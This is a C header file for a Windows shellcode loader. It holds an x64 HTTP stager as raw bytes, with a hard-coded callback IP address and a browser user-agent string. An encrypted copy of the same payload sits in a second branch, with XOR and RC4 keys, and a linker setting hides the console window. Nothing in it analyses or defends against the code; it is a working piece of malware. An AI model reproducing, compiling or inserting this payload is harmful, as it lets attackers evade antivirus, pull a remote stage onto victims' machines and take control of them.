#pragma once


unsigned char xor_key = 0x87;
unsigned char rc4_key[] = "!#@$%^&*()";
unsigned long rc4_key_len = sizeof(rc4_key) - 1;

//#define ENCODE

#ifndef ENCODE
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
//#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"main\"")
#endif
///////////////////////////////////////////////////
#ifdef ENCODE
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\x00\x80\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x72\x4f\x66\x36\x00\x09\x30\x6f\xe7\xaf\x79\x0e\xf1\xe2\x8e\xf8\xeb\x1c\x09\x26\xd0\xd9\x4e\x08\x6c\xc6\x87\xdb\xe0\x29\xe9\x61\x2b\x3c\x7a\x2b\x03\x9c\x9e\x9e\x02\x81\xbe\xf6\x2f\x74\x03\xf4\xa9\x74\xf2\x46\xce\xcf\xc9\xe6\xf1\xe6\xbb\xc6\x38\x2d\x75\xa1\x95\xc5\x91\x73\xec\xf8\x3d\xb4\x16\x98\x13\xc1\xef\x03\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x41\x55\x29\x0d\x0a\x00\x88\x84\x92\x7b\x9e\xbc\x68\xa4\xa8\x86\x0c\x5a\x0a\x8e\x15\x83\xe1\xd8\xdc\x2d\x5d\xbb\xc0\xcf\x97\xf4\x0b\x00\xe8\xa3\x97\x2e\x21\x89\xc6\xd5\x45\x1b\x3e\xde\x2b\xbd\xd7\x40\x90\xe4\x57\x84\xc6\xc4\x41\xe4\xae\x53\xe3\x56\x03\xfd\x60\xef\xd2\x4a\xca\xc6\xa7\xa1\xec\xde\x56\x48\xd8\x1d\x1e\xfa\x55\xbc\xea\x67\xf3\xf6\xc3\x66\x41\x5e\xfd\x7c\x15\xe8\x61\x25\x19\x9a\xb6\xa5\x45\x08\xd5\x45\x49\x11\xc0\x4e\xf8\x69\xe7\x12\x6d\x1f\xbe\x3e\x29\x26\x15\xa9\x4a\x78\x0c\x4e\x4e\x2f\xbb\xda\x15\x6b\x15\x6b\x4b\xd4\x45\x02\x0d\xf7\xf9\x02\xd9\x88\x18\xa6\xe6\x02\xd0\x4a\xb7\x68\xe4\x6e\xc9\x44\xc6\x5d\x24\xfe\x0f\x89\xc2\xdf\x04\xb3\xb0\x64\xc4\x6e\x54\xed\x55\x09\xf4\xdc\xfd\xb0\x8f\xeb\x09\x4c\x1b\x74\x9b\x51\xa6\x63\xbf\xf5\xd4\xcf\xe1\x5f\x15\xef\x61\x38\x96\x51\xad\x20\x34\x66\x28\x1a\xe0\x2c\x42\xd7\x02\xcb\xca\x10\x65\x01\x46\xa0\x6d\x09\x87\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x39\x35\x2e\x31\x33\x33\x2e\x35\x33\x2e\x31\x34\x36\x00\x19\x69\xa0\x8d";;

#else
unsigned char shellcode[] = { 0x89,0xf4,0x58,0x66,0x0e,0xb3,0x0d,0x3c,0xd6,0xf7,0xd0,0x39,0x69,0x48,0xec,0xc3,0x62,0xe5,0xac,0x87,0x19,0xb2,0x57,0x8f,0x7b,0x6c,0x60,0x67,0xb1,0xfa,0xea,0x82,0x2e,0xb2,0x5b,0x41,0x63,0x79,0x6e,0x99,0x0f,0x0b,0x06,0xfb,0x2d,0xca,0x49,0xdb,0x4a,0xbd,0x2a,0xbe,0xca,0x2e,0x3c,0x6d,0x75,0x3c,0x7b,0xdb,0x2c,0x67,0x5d,0x22,0xd3,0x5c,0x23,0x40,0x03,0x35,0x35,0xea,0xa2,0xb5,0xa0,0xe9,0x68,0xcb,0x70,0xeb,0x64,0x0a,0x5b,0xe4,0x4d,0xea,0x7a,0xce,0xcc,0x11,0x92,0x68,0x1f,0x74,0x4a,0xae,0x15,0x0e,0xa9,0x90,0x30,0x51,0xa5,0x45,0x63,0xf4,0x70,0xe4,0x05,0x19,0x79,0x17,0xe2,0xe6,0x6f,0x1d,0xbf,0xe4,0xea,0xe0,0x10,0x94,0xef,0xbb,0x9b,0x57,0xe9,0x47,0x75,0x3c,0x8b,0xe3,0xb2,0x4b,0x0a,0xb5,0x2c,0x04,0x3b,0x05,0x39,0x27,0x9c,0x7b,0xc5,0x14,0x30,0x58,0x06,0x16,0xf4,0x9c,0x31,0xff,0x6c,0x98,0x04,0x67,0x0e,0x4a,0x2a,0xd2,0xd9,0x97,0x29,0x02,0xd4,0x25,0xeb,0xa3,0x59,0x63,0x34,0x71,0x9b,0x64,0xd9,0x0d,0x97,0x6e,0xdd,0xd6,0xfd,0x33,0x99,0x3e,0x62,0xf8,0x83,0x0f,0x32,0xde,0x31,0x73,0x44,0x24,0x4f,0xe5,0xf8,0x03,0x8a,0x5b,0xd0,0x41,0xa0,0xe9,0x00,0x30,0x39,0x77,0xac,0xd4,0x84,0x22,0x8e,0x2c,0x3d,0x65,0x7f,0xef,0xc8,0xc0,0xc7,0xcb,0x22,0xfc,0x47,0x40,0x8d,0xbf,0xec,0x1e,0x88,0x6c,0x04,0x71,0xe5,0xc4,0xd0,0x17,0xc8,0xda,0x8d,0xd4,0x9b,0x02,0x07,0xbc,0xa2,0x75,0x81,0x48,0xb1,0xa9,0xa2,0x17,0x51,0x30,0x25,0x02,0x0f,0x9d,0x54,0xed,0x55,0xb9,0x38,0x1e,0xf9,0x32,0x21,0x22,0x45,0xa4,0x97,0xc9,0xb1,0xc3,0x69,0x6d,0x82,0x23,0x40,0xe2,0x10,0xec,0x76,0x34,0x16,0xd2,0x16,0x95,0xc2,0xf9,0xe0,0xde,0x8b,0xb8,0xd5,0xbb,0x98,0x55,0x78,0x2b,0xa4,0xdc,0x90,0x49,0xaa,0xfb,0x8d,0x14,0x1d,0x4b,0x0b,0xa4,0x58,0xd0,0xcd,0xd1,0x24,0x0a,0x34,0x31,0x44,0xa8,0xc8,0x1a,0x2e,0x62,0xc2,0x59,0x5c,0x41,0x2c,0x30,0x47,0x4c,0x0f,0xed,0x2a,0x37,0xd8,0xee,0xc1,0x31,0x84,0x56,0xc4,0x32,0x7c,0x83,0x58,0x74,0xcc,0x27,0xdc,0x45,0xa9,0x44,0xcd,0x00,0xe6,0x16,0xe0,0xb4,0x54,0x42,0x19,0x4a,0x2f,0xa9,0xf4,0x0b,0x68,0xd9,0x31,0x44,0x95,0xd7,0x47,0xe3,0x57,0xa7,0x3a,0x02,0xf9,0x20,0x40,0x2f,0x60,0x22,0x0f,0x93,0x4f,0x3f,0xaa,0x08,0xbd,0xc9,0xb7,0xe4,0xed,0xdc,0x8f,0xc9,0x53,0x02,0x59,0x98,0x13,0x60,0x53,0xdd,0xb5,0x5f,0xa1,0x7e,0x0b,0xa8,0x64,0x9a,0x56,0x61,0x58,0xf6,0x1c,0x35,0xc9,0xad,0x68,0xed,0x14,0xb0,0x98,0x60,0x46,0x8d,0xcf,0x2b,0xd2,0x3f,0x2f,0xcc,0x0d,0xf3,0x13,0x1f,0x6f,0xd6,0x3f,0x75,0x70,0xac,0xff,0x0e,0xa1,0x45,0x5a,0x56,0xad,0xf0,0x9e,0xe9,0xa4,0x13,0x8a,0x6f,0x9b,0xcb,0xa4,0x4f,0x52,0x78,0x29,0x0d,0xe1,0x56,0x59,0xd8,0xf0,0xef,0xb5,0xef,0x30,0x4c,0xf4,0x71,0x6f,0x26,0x8f,0x52,0x0c,0x2f,0xa9,0x5e,0x85,0xd4,0x40,0x8e,0x00,0x89,0x63,0x63,0xc2,0x0a,0x33,0x59,0x64,0x76,0x91,0xfe,0x16,0xdc,0x60,0x3c,0xaa,0x86,0xfb,0xdb,0x16,0x4f,0x05,0x49,0x2c,0x13,0xa7,0x04,0xb2,0x2b,0x4f,0xfd,0xa1,0x63,0x43,0x4c,0xa5,0x8a,0xff,0xe5,0xf2,0x6c,0x39,0x7c,0x8a,0x1f,0x59,0xd6,0xec,0x6c,0x72,0xf9,0x99,0x04,0x44,0x86,0xd5,0xa7,0x90,0xbd,0xb1,0x65,0xc1,0xcc,0x99,0xa9,0x33,0x57,0x80,0x7d,0x9a,0x27,0x55,0x07,0xae,0xd3,0x89,0x77,0x6b,0x5f,0x15,0xb0,0xd1,0xda,0x22,0x5b,0x1e,0x0a,0x14,0xc4,0xe3,0xcc,0x4a,0x6c,0x59,0x9b,0x58,0xf7,0x95,0xcb,0x16,0x23,0x97,0x36,0xbf,0xb1,0xae,0xfc,0x81,0xd6,0x51,0xbb,0x98,0xf2,0x1f,0x52,0xe9,0x4c,0x36,0x61,0x5b,0xc9,0x43,0x24,0x13,0xd0,0x1f,0xd8,0xbf,0xe5,0xd6,0xcf,0x41,0xc7,0xf8,0x01,0x09,0xba,0xdf,0xa2,0xbc,0x59,0xec,0x71,0xcc,0x0a,0xd0,0xab,0x1d,0xa2,0x3c,0x2c,0x3d,0xe9,0xa2,0xe3,0x84,0x9d,0x6c,0x3f,0x18,0x4d,0xfe,0x3d,0x58,0x64,0xfa,0x71,0xf4,0xee,0x17,0xf8,0x2c,0x62,0xda,0xbe,0x3b,0x51,0xfe,0xc6,0x0b,0x29,0xf0,0xd6,0x36,0x1f,0x2e,0xb0,0xa5,0x77,0x0b,0xf1,0xdc,0x08,0x1a,0xef,0xf5,0xab,0x54,0x3a,0xf6,0x54,0xa8,0x4f,0xa1,0xee,0x70,0xa5,0x75,0xc2,0xd3,0xa5,0x67,0xfb,0x81,0x2d,0x1f,0x4f,0xc1,0x41,0x7a,0x47,0x5f,0x89,0x6a,0x23,0xb5,0x89,0xe7,0x83,0xb8,0xcb,0x95,0x42,0x10,0x13,0xba,0x51,0x52,0x87,0x82,0xad,0xb0,0x76,0xa8,0xf8,0x8c,0x9f,0x34,0x47,0xe0,0x6f,0xb6,0xd1,0xdf,0x4a,0x9b,0xf6,0x44,0xbc,0x6e,0xe8,0x9c,0x45,0x54,0x00,0x5b,0xdd,0xcb,0x48,0x94,0x2b,0xe6,0xde,0x7b,0x12,0x22,0x14,0xd1,0x71,0xc3,0x30,0x9c,0x0a,0xf8,0x34,0x0c,0x7b,0x22,0xd2,0x22,0xb5,0x71,0x82,0x07,0x60,0xeb,0xfa,0x9d,0x27,0x15,0x46,0x77,0xc8,0x60,0x26,0x03,0x92,0xd4,0x7b,0x0c,0xd1,0x76,0x7e,0xf5,0xb3,0x0b,0x02,0x76,0x42,0xa3,0x83,0x88,0xf3,0x1f,0xa9,0xd4,0x50,0x3a,0x9e,0x16,0xdd,0xc5,0x99,0xb8,0x00,0x01,0xaa,0xe7,0x15,0x3e,0x4e,0x21,0x21,0x73,0x12,0xdc,0x8a,0x9e,0x61,0x0b,0xd0,0xf1,0x45,0xe3,0x66,0x42,0x4f,0xce,0xfc,0x31,0x5e,0x29,0xbc,0x6e,0x39,0x3f,0x82,0x37,0x29,0x91,0xa0,0xed,0x3b,0xae,0xd7,0xae,0x3b,0x4b,0xc1,0x0b,0x66,0x55,0x5f,0x96,0x3f,0x18,0xce,0xe0,0xe9,0xe0,0x71,0x53,0x71,0xaf,0x3c,0x97,0x25,0x5a,0x26,0x6f,0xcb,0xbe,0xa0,0x78,0x60,0xf2,0x1f,0xa8,0x97,0xbf,0x3e,0x67,0x4a,0x1f,0x25,0x01,0xb5,0x9f,0x89,0x11,0xaa,0x54,0xf8,0x8e,0xe7,0x32,0x32,0x07 };
#endif
///////////////////////////////////////////////////
int len_shellcode = sizeof(shellcode);